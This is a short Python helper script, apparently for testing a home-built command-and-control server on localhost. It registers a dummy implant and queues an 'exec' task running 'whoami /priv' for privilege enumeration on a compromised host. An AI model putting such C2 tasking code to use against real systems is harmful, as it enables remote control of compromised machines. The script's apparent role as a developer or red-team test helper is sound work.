import requests 
from urllib.parse import urljoin 
from implant_pb2 import Task, Register

c2 = "http://127.0.0.1:5000"

task_create = "task/create"
register = "/register"


def create_dummy_task(implant_id=1, opcode="exec", args="whoami /priv"):
    task = Task()
    task.implant_id = implant_id
    task.opcode = opcode
    task.args = args
    
    r = requests.post(urljoin(c2, task_create), data=task.SerializeToString())
    if r.status_code == 200:
        print("Task created successfully.")
    else:
        print("Failed to create task.")

def create_dummy_implant():
    register_msg = Register()
    register_msg.password = "foobar"
    register_msg.username = "lol"
    register_msg.hostname = "Ghost"
    register_msg.guid = "xxxxxxxxxxxx"
    
    r = requests.post(urljoin(c2, register), data=register_msg.SerializeToString())
    if r.status_code == 200:
        print("Registered successfully.")
    else:
        print("Failed to register.")

#create_dummy_task()
